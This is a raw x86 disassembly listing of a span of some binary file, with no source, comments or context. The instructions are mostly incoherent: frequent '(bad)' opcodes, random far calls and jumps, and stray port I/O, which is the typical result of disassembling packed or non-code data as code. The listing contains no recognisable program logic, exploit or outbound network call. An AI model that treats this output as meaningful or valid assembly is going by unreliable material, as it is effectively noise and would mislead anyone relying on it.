  4133b5:	mov    eax,ds:0xd733fbcc
  4133ba:	push   edx
  4133bb:	dec    ebp
  4133bc:	dec    esi
  4133bd:	fisubr DWORD PTR [edi]
  4133bf:	shl    esi,1
  4133c1:	int    0xfb
  4133c3:	js     0x413374
  4133c5:	sahf   
  4133c6:	push   0xffffffe5
  4133c8:	adc    ecx,DWORD PTR [ebp+edi*2-0x478a71e4]
  4133cf:	sbb    cl,dh
  4133d1:	arpl   WORD PTR [ecx],dx
  4133d3:	jb     0x4133f4
  4133d5:	and    edi,edi
  4133d7:	outs   dx,DWORD PTR ds:[esi]
  4133d8:	push   ecx
  4133d9:	arpl   WORD PTR [edx+ebx*2],si
  4133dc:	mov    cl,0xa2
  4133de:	mov    esi,0x1d08169a
  4133e3:	mov    ch,al
  4133e5:	push   ecx
  4133e6:	jne    0x413423
  4133e8:	pop    ebx
  4133e9:	fsubr  DWORD PTR [ebx+0x44]
  4133ec:	sbb    bl,BYTE PTR [ecx+ebx*2]
  4133ef:	add    eax,0xaf4d01b3
  4133f4:	cwde   
  4133f5:	es (bad) 
  4133f7:	cmp    al,BYTE PTR [eax+0xf]
  4133fa:	and    ch,al
  4133fc:	add    BYTE PTR [eax],al
  4133fe:	add    BYTE PTR [eax],al
  413400:	add    BYTE PTR [eax],al
  413402:	cwde   
  413403:	and    BYTE PTR [eax],dl
  413405:	add    BYTE PTR [eax+0x3],bh
  413408:	adc    BYTE PTR [eax],al
  41340a:	mov    ebp,0xf600105c
  41340f:	push   ebp
  413410:	adc    BYTE PTR [eax],al
  413412:	and    eax,0x3800107b
  413417:	cmp    DWORD PTR [eax],edx
  413419:	add    BYTE PTR [ebp+edx*1+0x1e9b0010],cl
  413420:	adc    BYTE PTR [eax],al
  413422:	jecxz  0x413443
  413424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413425:	adc    al,0xfe
  413427:	mov    ebp,0x9faffff3
  41342c:	test   ah,0x77
  41342f:	adc    al,BYTE PTR [ebx+0x13719b8]
  413435:	add    BYTE PTR [edx],ah
  413437:	pop    es
  413438:	add    BYTE PTR [eax],al
  41343a:	test   DWORD PTR [ebp-0x1efc08a9],esp
  413440:	repnz shr DWORD PTR [ecx+ebp*8+0x25],cl
  413445:	mov    al,0x5f
  413447:	xchg   edi,eax
  413448:	(bad)  
  413449:	in     eax,0x97
  41344b:	jns    0x4134b4
  41344d:	jg     0x4133e4
  41344f:	enter  0x3306,0xdf
  413453:	xchg   DWORD PTR [edi-0xf3d70be],ebp
  413459:	xor    DWORD PTR [esp+ebp*8+0x6e156cfb],0x8086892c
  413464:	scas   eax,DWORD PTR es:[edi]
  413465:	ret    
  413466:	add    bh,dl
  413468:	xlat   BYTE PTR ds:[ebx]
  413469:	add    cl,BYTE PTR [eax]
  41346b:	sub    DWORD PTR [esi+ecx*8-0x2c],ebx
  41346f:	push   eax
  413470:	lea    edx,[ecx+0x3e]
  413473:	or     DWORD PTR [ebx-0x7d6ea5fd],esp
  413479:	fisttp DWORD PTR [ebp+ecx*2+0x5e4553d6]
  413480:	out    0x3f,al
  413482:	ret    0x4caf
  413485:	mov    ecx,0xb9eb0f8a
  41348a:	icebp  
  41348b:	or     BYTE PTR [edx],dl
  41348d:	jmp    0xea68:0x58a0d9b6
  413494:	test   eax,0x839c61db
  413499:	call   0x922f:0x10d20569
  4134a0:	or     eax,0x726dc15c
  4134a5:	adc    eax,0xd8ed8608
  4134aa:	xchg   edi,eax
  4134ab:	loope  0x41352c
  4134ad:	out    0x2d,eax
  4134af:	shl    BYTE PTR [ebp-0x66],0x17
  4134b3:	sub    BYTE PTR [edx],al
  4134b5:	int    0x78
  4134b7:	sbb    eax,eax
  4134b9:	pop    ss
  4134ba:	mov    al,ds:0x9cef635e
  4134bf:	xor    BYTE PTR [eax-0x1d3f3238],al
  4134c5:	(bad)  
  4134c6:	mov    edx,0x1cb37a92
  4134cb:	sub    bh,BYTE PTR [esi+ecx*4+0x78]
  4134cf:	push   eax
  4134d0:	mov    edx,0xebb64fb5
  4134d5:	pop    ss
  4134d6:	sbb    bl,ch
  4134d8:	mov    al,BYTE PTR [eax-0x64f3ad40]
  4134de:	xor    ecx,ecx
  4134e0:	or     edi,DWORD PTR [edi+0x5a]
  4134e3:	jnp    0x413547
  4134e5:	inc    edi
  4134e6:	pop    es
  4134e7:	add    DWORD PTR [ebx-0x5d5a2329],ebx
  4134ed:	cmp    BYTE PTR [ebx+0x48],0xdb
  4134f1:	mov    ds:0x53e9c7c9,al
  4134f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134f7:	sbb    eax,0x22
  4134fa:	(bad)  
  4134fb:	imul   ebp,DWORD PTR [esi],0xe5bb038d
  413501:	cmp    al,0xfb
  413503:	mov    ecx,0xc9f7420a
  413508:	mov    edi,0xd2db1d4a
  41350d:	popa   
  41350e:	push   ecx
  41350f:	das    
  413510:	fsubr  QWORD PTR [esi-0x1607a0d0]
  413516:	pop    ss
  413517:	xchg   ecx,eax
  413518:	adc    DWORD PTR [esi-0x76],0x1a
  41351c:	jp     0x413510
  41351e:	or     eax,0x63445452
  413523:	pop    es
  413524:	scas   al,BYTE PTR es:[edi]
  413525:	outs   dx,DWORD PTR es:[esi]
  413527:	xor    eax,0xffffffdb
  41352a:	lods   eax,DWORD PTR ds:[esi]
  41352b:	adc    BYTE PTR [bp+si+0x64],0xed
  413530:	push   es
  413531:	and    al,0x43
  413533:	add    eax,0x38eb1268
  413538:	cmp    esp,0x42
  41353b:	imul   edi,DWORD PTR [edx],0x8f84602
  413541:	cwde   
  413542:	push   edi
  413543:	mov    BYTE PTR [esi+0x1b],al
  413546:	arpl   WORD PTR [eax+0x21],sp
  413549:	push   eax
  41354a:	ja     0x4134d2
  41354c:	mov    edx,0x72090b1e
  413551:	jge    0x4135bb
  413553:	(bad)  
  413555:	call   0x99d0:0x3f975520
  41355c:	imul   edx,DWORD PTR [edi+0x61492a65],0x35
  413563:	xor    ah,BYTE PTR [esi+0x63f7fadb]
  413569:	test   BYTE PTR [ebx-0x10],dl
  41356c:	mov    ?,WORD PTR [ebp-0x78]
  41356f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413570:	mov    esp,0x1c41577d
  413575:	std    
  413576:	clc    
  413577:	rep outs dx,DWORD PTR ds:[esi]
  413579:	sub    al,0x47
  41357b:	inc    esi
  41357c:	adc    BYTE PTR [esi+0x3b],dh
  41357f:	mov    ecx,0x302746b5
  413584:	mov    dl,0xe
  413586:	push   ebp
  413587:	(bad)  
  413588:	in     eax,dx
  413589:	outs   dx,DWORD PTR ds:[esi]
  41358a:	jbe    0x4135dc
  41358c:	ins    BYTE PTR es:[edi],dx
  41358d:	cmp    BYTE PTR [edi+esi*4+0x4f],bh
  413591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413592:	div    BYTE PTR [ebp-0xe]
  413595:	jmp    0x4135db
  413597:	push   es
  413598:	and    BYTE PTR [eax],ch
  41359a:	pusha  
  41359b:	push   ds
  41359c:	idiv   DWORD PTR [ecx]
  41359e:	test   al,0x2a
  4135a0:	pop    esi
  4135a1:	pop    edx
  4135a2:	test   BYTE PTR [esi+0x38ac5f98],bl
  4135a8:	mov    al,0x7b
  4135aa:	xor    BYTE PTR ds:0xe6ace8a0,ch
  4135b0:	xchg   ecx,eax
  4135b1:	cmc    
  4135b2:	mov    ah,BYTE PTR [esi-0x5a]
  4135b5:	or     BYTE PTR [ebp+0x11dcc55f],bh
  4135bb:	dec    ebp
  4135bc:	idiv   esp
  4135be:	fbld   TBYTE PTR [ebp+0x61]
  4135c1:	test   edx,ebx
  4135c3:	pop    es
  4135c4:	adc    bh,dh
  4135c6:	loope  0x4135af
  4135c8:	cmp    DWORD PTR [ebx],eax
  4135ca:	pop    eax
  4135cb:	aad    0xa9
  4135cd:	cwde   
  4135ce:	dec    esi
  4135cf:	neg    BYTE PTR [edi+0x191f7c3f]
  4135d5:	sub    al,0xc3
  4135d7:	imul   esi,DWORD PTR [ebx],0x76065d8b
  4135dd:	sbb    BYTE PTR [ecx],bh
  4135df:	std    
  4135e0:	xchg   esi,eax
  4135e1:	inc    esi
  4135e2:	repnz pop edx
  4135e4:	aaa    
  4135e5:	adc    DWORD PTR [ecx+edi*1-0x7a],edx
  4135e9:	dec    ebx
  4135ea:	mov    ds:0x6deca35d,eax
  4135ef:	or     ah,BYTE PTR [ebx]
  4135f1:	sbb    DWORD PTR [eax-0x16d00577],ebx
  4135f7:	and    eax,DWORD PTR [ebp+0x23080051]
  4135fd:	jecxz  0x41365f
  4135ff:	adc    al,0xf6
  413601:	sbb    dl,bl
  413603:	(bad)  
  413604:	push   cs
  413605:	pop    ebx
  413606:	mov    esi,0x3656a804
  41360b:	iret   
  41360c:	test   BYTE PTR [edi-0x68],cl
  41360f:	inc    ecx
  413610:	aam    0x4d
  413612:	add    al,0x11
  413614:	aas    
  413615:	rcl    BYTE PTR [esi],0xc7
  413618:	test   BYTE PTR [ebx+0x37a5c7d2],0x4b
  41361f:	js     0x4135fe
  413621:	adc    BYTE PTR [eax-0xfd72407],al
  413627:	and    ecx,DWORD PTR [edi]
  413629:	scas   al,BYTE PTR es:[edi]
  41362a:	or     ah,BYTE PTR [ecx+0x1c]
  41362d:	mov    esp,0xe0f7010d
  413632:	jecxz  0x41368a
  413634:	adc    al,BYTE PTR [ecx+0x55]
  413637:	cdq    
  413638:	bsr    esi,DWORD PTR ds:0x63ee0e02
  41363f:	lock retf 
  413641:	retf   0x9b74
  413644:	pop    ss
  413645:	rcr    DWORD PTR [edi-0x4488108b],1
  41364b:	into   
  41364c:	popa   
  41364d:	call   0x1d2ddc17
  413652:	xchg   esp,eax
  413653:	iret   
  413654:	shr    BYTE PTR [esi+0x8],1
  413657:	add    al,0xdb
  413659:	nop
  41365a:	pusha  
  41365b:	out    dx,eax
  41365c:	jp     0x413662
  41365e:	test   eax,0x9946dbd6
  413663:	and    al,0x45
  413665:	adc    BYTE PTR [esi+0x35],ch
  413668:	clc    
  413669:	call   0xc315d8c6
  41366e:	mov    cl,0x99
  413670:	pop    ebx
  413671:	(bad)  
  413672:	out    0x71,al
  413674:	inc    edx
  413675:	dec    esi
  413676:	xlat   BYTE PTR ds:[ebx]
  413677:	mov    esp,0x984d26fb
  41367c:	out    dx,al
  41367d:	adc    al,0xaa
  41367f:	cmp    bh,BYTE PTR [esi+0x24]
  413682:	jmp    0xd4bd:0x2fae056d
  413689:	fild   WORD PTR [ecx]
  41368b:	int3   
  41368c:	adc    BYTE PTR [edx+0x756e6bc3],dl
  413692:	js     0x413678
  413694:	stos   BYTE PTR es:[edi],al
  413695:	rol    ah,1
  413697:	sahf   
  413698:	aam    0x86
  41369a:	lock pop edx
  41369c:	xchg   ebx,eax
  41369d:	xor    BYTE PTR [eax+0x55],ch
  4136a0:	jmp    0x413673
  4136a2:	inc    esi
  4136a3:	or     eax,0x15d8bb0d
  4136a8:	push   ecx
  4136a9:	pop    es
  4136aa:	inc    edx
  4136ab:	or     al,BYTE PTR [ebp-0x6a67f35a]
  4136b1:	es hlt 
  4136b3:	enter  0x184a,0xfe
  4136b7:	imul   eax,DWORD PTR [edi-0x80],0xc34780af
  4136be:	shl    BYTE PTR [edx+0x3],0x1
  4136c2:	jno    0x4136dc
  4136c4:	les    ecx,FWORD PTR [ecx]
  4136c6:	clc    
  4136c7:	inc    edi
  4136c8:	je     0x4136f8
  4136ca:	or     eax,0x8e0fcd6
  4136cf:	ret    0x9642
  4136d2:	jmp    0xdd716f42
  4136d7:	or     eax,DWORD PTR [ecx+0x6f]
  4136da:	cwde   
  4136db:	addr16 sahf 
  4136dd:	xor    al,0x6f
  4136df:	xchg   BYTE PTR [esi+0x3a],dh
  4136e2:	push   ebp
  4136e3:	push   0x982d230c
  4136e8:	mov    esp,0x38492dd7
  4136ed:	inc    esi
  4136ee:	out    dx,al
  4136ef:	icebp  
  4136f0:	mov    bl,0x4e
  4136f2:	cmp    BYTE PTR [edx+0x48],ah
  4136f5:	and    al,0x8d
  4136f7:	repz pop edx
  4136f9:	scas   al,BYTE PTR es:[edi]
  4136fa:	mov    ah,0x64
  4136fc:	dec    BYTE PTR [ebx+ebx*1]
  4136ff:	push   edx
  413700:	mov    cl,0x4b
  413702:	mov    bl,ch
  413704:	aaa    
  413705:	sbb    bh,BYTE PTR [eax-0xd]
  413708:	loope  0x413699
  41370a:	popf   
  41370b:	bound  ecx,QWORD PTR [eax]
  41370d:	rcr    ch,0x56
  413710:	adc    bh,BYTE PTR [esi-0x80]
  413713:	or     BYTE PTR [edi-0x8],ah
  413716:	dec    ebx
  413717:	fsubr  DWORD PTR [ebp+0x76ba72bf]
  41371d:	jns    0x4136be
  41371f:	mov    bl,0x43
  413721:	lods   al,BYTE PTR ds:[esi]
  413722:	lock mov edi,ebp
  413725:	add    eax,0xc7d8b143
  41372a:	aas    
  41372b:	xor    dh,BYTE PTR gs:[ebp+0x42]
  41372f:	sub    eax,0x657575b2
  413734:	inc    ecx
  413735:	fwait
  413736:	ret    
  413737:	es iret 
  413739:	cli    
  41373a:	mov    ds:0x4c3632a5,al
  41373f:	mov    DWORD PTR [ecx+0x533c4b04],ecx
  413745:	rep outs dx,DWORD PTR ds:[esi]
  413747:	sub    BYTE PTR [esi+edx*4-0x33],al
  41374b:	inc    ebx
  41374c:	addr16 cdq 
  41374e:	dec    edx
  41374f:	xchg   BYTE PTR [eax-0x2d038085],ch
  413755:	in     al,0x8c
  413757:	(bad)  [eax+0x79]
  41375a:	xor    BYTE PTR [edx-0xb],dl
  41375d:	retf   
  41375e:	mov    esi,0xd5622dec
  413763:	inc    ebx
  413764:	popf   
  413765:	ss stos DWORD PTR es:[edi],eax
  413767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413768:	mov    edx,0xbb60ea37
  41376d:	stos   DWORD PTR es:[edi],eax
  41376e:	mov    esi,0x97dd9f82
  413773:	jo     0x4137b6
  413775:	in     eax,dx
  413776:	loope  0x4137ea
  413778:	data16 fstp DWORD PTR [ebx-0x1b6105fc]
  41377f:	pop    ecx
  413780:	mov    ah,0xa
  413782:	cwde   
  413783:	ja     0x41377f
  413785:	cmp    cl,BYTE PTR [eax+0xe0fdee]
  41378b:	dec    esi
  41378c:	add    DWORD PTR ds:0x45667b81,0x66
  413793:	mov    al,ds:0x7dca0862
  413798:	push   cs
  413799:	jo     0x4137c2
  41379b:	mov    ebp,0xa3c275e0
  4137a0:	cmp    al,0x52
  4137a2:	xor    BYTE PTR [ebx+edx*4],bl
  4137a5:	sub    DWORD PTR [ebp+0x23a8af4f],0xaf0c8475
  4137af:	jl     0x41374b
  4137b1:	dec    edx
  4137b2:	dec    esi
  4137b3:	lock jbe 0x41382f
  4137b6:	push   es
  4137b7:	daa    
  4137b8:	or     edx,edx
  4137ba:	jns    0x413759
  4137bc:	ror    DWORD PTR [ebx],0x2f
  4137bf:	sub    al,0x12
  4137c1:	das    
  4137c2:	(bad)  
  4137c3:	cmp    BYTE PTR [ebx+0xe],ah
  4137c6:	stos   DWORD PTR es:[edi],eax
  4137c7:	jae    0x41382c
  4137c9:	leave  
  4137ca:	rol    esp,cl
  4137cc:	and    ah,ch
  4137ce:	pop    esi
  4137cf:	or     BYTE PTR ds:0x23b4f81,ah
  4137d5:	push   eax
  4137d6:	mov    edx,DWORD PTR [esi-0xd]
  4137d9:	(bad)  
  4137da:	out    0x99,al
  4137dc:	pop    edx
  4137dd:	out    dx,eax
  4137de:	gs xor eax,0x567479dc
  4137e4:	inc    ebx
  4137e5:	out    0xe1,eax
  4137e7:	jg     0x413853
  4137e9:	aam    0xe7
  4137eb:	into   
  4137ec:	mov    al,0x17
  4137ee:	ja     0x413858
  4137f0:	xor    DWORD PTR [esp+ebx*4+0x8ff415d],esi
  4137f7:	push   0x2b7c7836
  4137fc:	bound  esp,QWORD PTR [edi-0x24]
  4137ff:	sbb    eax,0xd7bce770
  413804:	push   ecx
  413805:	outs   dx,BYTE PTR ds:[esi]
  413806:	mov    cl,0xb5
  413808:	or     al,0x51
  41380a:	test   BYTE PTR [edx+0x55],ch
  41380d:	mov    ds:0x7d630d87,eax
  413812:	push   eax
  413813:	neg    BYTE PTR [ecx+0x630e9d81]
  413819:	out    dx,eax
  41381a:	and    al,0x1d
  41381c:	call   FWORD PTR [edx-0xf]
  41381f:	int3   
  413820:	imul   esp,DWORD PTR [ebp-0x4e],0x10b89af5
  413827:	jl     0x41389d
  413829:	fs jp  0x413813
  41382c:	xchg   edx,eax
  41382d:	fnstenv [esi-0x49]
  413830:	pop    edi
  413831:	call   0xb31b:0x6e58d12a
  413838:	adc    al,0xee
  41383a:	lods   al,BYTE PTR ds:[esi]
  41383b:	jne    0x4138bb
  41383d:	shr    eax,1
  41383f:	fcom   DWORD PTR [edi+0x7e]
  413842:	in     eax,0xc3
  413844:	jg     0x4138a3
  413846:	pop    esi
  413847:	xchg   esp,eax
  413848:	cmp    cl,cl
  41384a:	xchg   ebp,eax
  41384b:	sub    BYTE PTR [edx-0x7e],al
  41384e:	sub    DWORD PTR [ecx],esi
  413850:	xchg   edx,eax
  413851:	icebp  
  413852:	mov    edx,edx
  413854:	lods   eax,DWORD PTR ds:[esi]
  413855:	adc    edi,esp
  413857:	push   ss
  413858:	sbb    BYTE PTR [ecx-0x6c],ch
  41385b:	je     0x4137fa
  41385d:	jnp    0x4137e4
  41385f:	ror    BYTE PTR [esi-0x40497643],1
  413865:	push   0x75
  413867:	sbb    DWORD PTR [edi+0xa],edx
  41386a:	xchg   edx,eax
  41386b:	adc    DWORD PTR [ebp+eax*1+0x43ac4135],0x8860dcce
  413876:	xchg   DWORD PTR [edi*2+0x648d25aa],ebx
  41387d:	into   
  41387e:	fild   DWORD PTR [ecx+0x3426b514]
  413884:	jmp    0xd2538d7c
  413889:	loop   0x4138a6
  41388b:	adc    DWORD PTR [edi*4-0x31c0bc03],ebp
  413892:	das    
  413893:	dec    edi
  413894:	dec    edx
  413895:	cs or  al,0xbe
  413898:	in     eax,dx
  413899:	rol    BYTE PTR [ebx],cl
  41389b:	call   0x9da3:0x96be3d9f
  4138a2:	adc    ecx,edi
  4138a4:	push   ds
  4138a5:	out    0x6f,al
  4138a7:	ss dec esp
  4138a9:	lea    eax,[ecx-0x734865d0]
  4138af:	(bad)
  4138b2:	jb     0x413876
  4138b4:	push   cs
  4138b5:	xchg   edi,eax
  4138b6:	and    al,0x58
  4138b8:	lods   eax,DWORD PTR ds:[esi]
  4138b9:	gs cmp eax,0x74fa88c9
  4138bf:	test   edx,edi
  4138c1:	jl     0x4138d6
  4138c3:	(bad)  
  4138c4:	out    dx,eax
  4138c5:	inc    ecx
  4138c6:	call   0xe8d24652
  4138cb:	xlat   BYTE PTR ds:[ebx]
  4138cc:	xchg   ecx,eax
  4138cd:	loopne 0x413856
  4138cf:	cmp    eax,0xd1c651dd
  4138d4:	jne    0x4138c9
  4138d6:	mov    DWORD PTR [ebx-0xba08595],esi
  4138dc:	and    eax,0x48d62f46
  4138e1:	jg     0x41386a
  4138e3:	push   ebp
  4138e4:	jne    0x41388e
  4138e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138e7:	sub    ecx,DWORD PTR [edi+0x25]
  4138ea:	adc    ebp,esi
  4138ec:	popa   
  4138ed:	push   cs
  4138ee:	adc    DWORD PTR [ecx],ebx
  4138f0:	pop    ebx
  4138f1:	dec    DWORD PTR [ecx+0x55]
  4138f4:	jg     0x41393e
  4138f6:	dec    edx
  4138f7:	adc    BYTE PTR [ebx],cl
  4138f9:	test   eax,0x951222d4
  4138fe:	jmp    0xfc6afe97
  413903:	mov    BYTE PTR [esi-0x65c5c34],0x8e
  41390a:	shr    DWORD PTR [eax+0x66b604ae],0xa9
  413911:	jns    0x413908
  413913:	pop    es
  413914:	je     0x4138b4
  413916:	fmul   QWORD PTR [eax+ebx*1+0x72]
  41391a:	jae    0x41391d
  41391c:	adc    ch,bh
  41391e:	nop    edi
  413921:	mov    ecx,0xc7ce1104
  413926:	lock push es
  413928:	ret    
  413929:	pop    edi
  41392a:	add    DWORD PTR [eax],ebx
  41392c:	sbb    DWORD PTR [ebx],eax
  41392e:	sti    
  41392f:	push   esi
  413930:	pop    esp
  413931:	mov    ch,0xc5
  413933:	mov    WORD PTR [ecx+0x2c],?
  413936:	mov    ch,0x1f
  413938:	ficom  WORD PTR [ecx+0x18650b73]
  41393e:	push   0xffffffb7
  413940:	pop    edx
  413941:	(bad)  
  413943:	rcr    ebx,1
  413945:	je     0x41399e
  413947:	cmp    al,0x27
  413949:	cmp    al,0x5f
  41394b:	arpl   WORD PTR [edx+0x34],sp
  41394e:	or     BYTE PTR [edi+0x1],dh
  413951:	xor    bl,ah
  413953:	or     al,0x4e
  413955:	mov    ebx,0x33306f4c
  41395a:	out    0xdd,al
  41395c:	out    dx,eax
  41395d:	xchg   BYTE PTR [edx+0x26],bh
  413960:	adc    DWORD PTR [ebx],edi
  413962:	hlt    
  413963:	adc    ebp,0x32
  413966:	jecxz  0x413937
  413968:	and    edx,ecx
  41396a:	shld   DWORD PTR ds:0x33c11813,ecx,cl
  413971:	mov    BYTE PTR [edi+0x5415fde5],dh
  413977:	les    ebx,FWORD PTR [edi+0x78eefa0d]
  41397d:	dec    edx
  41397e:	ret    
  41397f:	dec    ecx
  413980:	jle    0x413983
  413982:	lods   eax,DWORD PTR ds:[esi]
  413983:	xchg   esp,eax
  413984:	add    al,0x1a
  413986:	sbb    dl,ch
  413988:	adc    DWORD PTR [ecx],0x16
  41398b:	jmp    DWORD PTR [esi-0x484cd3e7]
  413991:	and    esi,DWORD PTR [edx-0x32]
  413994:	dec    ecx
  413995:	clc    
  413996:	or     DWORD PTR [eax+0x65],edi
  413999:	clc    
  41399a:	inc    ebp
  41399b:	in     eax,dx
  41399c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41399d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41399e:	enter  0x7181,0x71
  4139a2:	push   cs
  4139a3:	dec    ecx
  4139a4:	xlat   BYTE PTR ds:[ebx]
  4139a5:	ret    
  4139a6:	xchg   DWORD PTR [ecx+0x21],eax
  4139a9:	jnp    0x4139da
  4139ab:	imul   ebx,DWORD PTR [eax+0x72],0x1621c5a4
  4139b2:	in     eax,0x42
  4139b4:	lock xchg ecx,eax
  4139b6:	call   0x6bcb:0xa1f1ef76
  4139bd:	in     al,dx
  4139be:	mov    ebx,ecx
  4139c0:	ins    DWORD PTR es:[edi],dx
  4139c1:	out    dx,eax
  4139c2:	test   eax,0xc4544f09
  4139c7:	popa   
  4139c8:	or     DWORD PTR [esi+0x39b14ff6],esi
  4139ce:	imul   esi,DWORD PTR [ebp-0x65],0x12
  4139d2:	dec    edx
  4139d3:	dec    esi
  4139d4:	das    
  4139d5:	add    DWORD PTR [eax],0x519d0bd7
  4139db:	xchg   esi,eax
  4139dc:	stos   DWORD PTR es:[edi],eax
  4139dd:	sub    eax,0xdbb5644b
  4139e2:	jle    0x413997
  4139e4:	jmp    0x453d:0x33cc5829
  4139eb:	push   ss
  4139ec:	out    dx,al
  4139ed:	mov    WORD PTR [ebx+0x58],es
  4139f0:	mov    al,ds:0x67cc1478
  4139f5:	push   edx
  4139f6:	pop    eax
  4139f7:	mov    DWORD PTR [esp+ebp*4+0x69],ecx
  4139fb:	adc    eax,0x99af063
  413a00:	mov    bh,0xb6
  413a02:	stos   DWORD PTR es:[edi],eax
  413a03:	cmp    eax,0xf7399a4
  413a08:	jge    0x4139c8
  413a0a:	or     ebp,DWORD PTR [eax-0x5e]
  413a0d:	mov    DWORD PTR ds:[edi],edi
  413a10:	lods   al,BYTE PTR ds:[esi]
  413a11:	and    ebp,DWORD PTR [edx]
  413a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a14:	ins    BYTE PTR es:[edi],dx
  413a15:	cmc    
  413a16:	lock and DWORD PTR [edi],ecx
  413a19:	fcom   DWORD PTR [ebx-0x4d]
  413a1c:	ret    
  413a1d:	sub    eax,0xb891ad30
  413a22:	test   eax,0xb2385216
  413a27:	sbb    al,0x6f
  413a29:	mov    esi,0x2cc4e704
  413a2e:	adc    eax,0x181d2323
  413a33:	add    esi,eax
  413a35:	push   ebp
  413a36:	add    eax,0x401c8c0a
  413a3b:	repz push 0x29
  413a3e:	sub    DWORD PTR [edx-0x24],0xcce28ac5
  413a45:	jno    0x4139db
  413a47:	es inc esp
  413a49:	cs push ss
  413a4b:	daa    
  413a4c:	pop    edi
  413a4d:	int3   
  413a4e:	push   ebx
  413a4f:	mov    ebp,DWORD PTR [ebx]
  413a51:	(bad)  
  413a52:	clc    
  413a53:	imul   ebp,DWORD PTR [edi],0x24
  413a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a57:	out    0xf9,eax
  413a59:	mov    ch,0xb5
  413a5b:	repnz xor al,0x9c
  413a5e:	sbb    eax,0xe36fc6c2
  413a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a64:	add    edi,DWORD PTR [eax+0x54]
  413a67:	je     0x413a30
  413a69:	mov    bl,0xc7
  413a6b:	sahf   
  413a6c:	stos   DWORD PTR es:[edi],eax
  413a6d:	dec    edx
  413a6e:	cmp    dl,BYTE PTR [edi]
  413a70:	jae    0x413aa3
  413a72:	imul   esi,DWORD PTR [ebx-0x1d],0xfffffffb
  413a76:	clc    
  413a77:	mov    bl,bh
  413a79:	rcl    DWORD PTR [ebx+0x3d02d098],0x56
  413a80:	data16 loopne 0x413ac9
  413a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a84:	aad    0xdf
  413a86:	loope  0x413a4d
  413a88:	test   BYTE PTR [esi+0x25],ch
  413a8b:	push   es
  413a8c:	fsubr  DWORD PTR [ecx+0x74]
  413a8f:	pop    ebx
  413a90:	inc    esi
  413a91:	and    DWORD PTR [esi+0x326ba6f4],ebp
  413a97:	ss pop edi
  413a99:	sbb    bl,dh
  413a9b:	jle    0x413a4e
  413a9d:	imul   ebp,DWORD PTR [edx+edi*2-0x60],0xffffffcd
  413aa2:	idiv   cl
  413aa4:	mov    al,0xf9
  413aa6:	sub    al,0x97
  413aa8:	dec    ebp
  413aa9:	mov    ah,0x19
  413aab:	outs   dx,DWORD PTR ds:[esi]
  413aac:	and    al,0xae
  413aae:	fcmovb st,st(0)
  413ab0:	mov    edx,eax
  413ab2:	mov    eax,0xc017dd6b
  413ab7:	mov    esp,0x5647613b
  413abc:	retf   
  413abd:	sar    ebp,1
  413abf:	(bad)  
  413ac0:	ins    BYTE PTR es:[edi],dx
  413ac1:	repz adc ecx,eax
  413ac4:	ret    
  413ac5:	or     al,0xab
  413ac7:	repz pop esi
  413ac9:	dec    ebp
  413aca:	ins    DWORD PTR es:[edi],dx
  413acb:	int    0xc
  413acd:	cwde   
  413ace:	std    
  413acf:	and    dl,dh
  413ad1:	pop    edx
  413ad2:	inc    ebx
  413ad3:	in     eax,0x5e
  413ad5:	repnz clc 
  413ad7:	out    dx,al
  413ad8:	scas   al,BYTE PTR es:[edi]
  413ad9:	stc    
  413ada:	fbld   TBYTE PTR [ecx]
  413adc:	mov    cl,0x25
  413ade:	nop
  413adf:	rol    ch,cl
  413ae1:	dec    edx
  413ae2:	pop    ebx
  413ae3:	xchg   DWORD PTR [esi],ecx
  413ae5:	push   ecx
  413ae6:	pop    ebx
  413ae7:	outs   dx,DWORD PTR ds:[esi]
  413ae8:	imul   ecx,DWORD PTR [ecx],0x4e
  413aeb:	sbb    DWORD PTR [esi+0x1d],edx
  413aee:	jae    0x413b6c
  413af0:	mov    esp,0x91bfb38c
  413af5:	add    DWORD PTR [eax],0xffffffc4
  413af8:	int    0x40
  413afa:	fnsave [eax-0x7d28d414]
  413b00:	neg    ah
  413b02:	sub    al,0xcc
  413b04:	mov    bh,0xb3
  413b06:	mov    ds:0x9a25c9fb,al
  413b0b:	dec    edx
  413b0c:	cld    
  413b0d:	add    ecx,DWORD PTR [esi+eiz*1-0x360d25c0]
  413b14:	xchg   ecx,eax
  413b15:	in     eax,dx
  413b16:	loopne 0x413b6d
  413b18:	nop
  413b19:	in     al,0x44
  413b1b:	int3   
  413b1c:	fs jne 0x413b19
  413b1f:	push   eax
  413b20:	xor    al,al
  413b22:	clc    
  413b23:	pop    es
  413b24:	lods   eax,DWORD PTR ds:[esi]
  413b25:	mov    BYTE PTR [ebp+edi*2-0x28],dh
  413b29:	stc    
  413b2a:	clc    
  413b2b:	cmp    BYTE PTR [bp+si-0x3249],dl
  413b30:	push   0x2d
  413b32:	mov    dl,0xbc
  413b34:	in     al,dx
  413b35:	mov    eax,ds:0xcb3ee7a6
  413b3a:	mov    bl,0xef
  413b3c:	mov    WORD PTR [esi],fs
  413b3e:	pop    ss
  413b3f:	dec    esp
  413b40:	cmp    ch,BYTE PTR [ecx]
  413b42:	push   ebp
  413b43:	or     DWORD PTR [edx+0x2],ecx
  413b46:	xor    DWORD PTR [ebp+0x14],ecx
  413b49:	push   0x51
  413b4b:	add    eax,0x2585508c
  413b50:	cmp    dl,BYTE PTR [eax+0x6]
  413b53:	std    
  413b54:	mov    ch,0xb7
  413b56:	adc    dh,BYTE PTR [esi+0x3f705a45]
  413b5c:	add    BYTE PTR [eax],al
  413b5e:	add    BYTE PTR [eax],al
  413b60:	add    BYTE PTR [eax],al
  413b62:	sbb    al,0x6c
  413b64:	ins    DWORD PTR es:[edi],dx
  413b65:	les    edi,FWORD PTR [ebp-0x3b]
  413b68:	mov    ebp,0x7e8bcdfc
  413b6d:	jae    0x413b28
  413b6f:	mov    edi,0x3e3ba30e
  413b74:	add    DWORD PTR [eax],eax
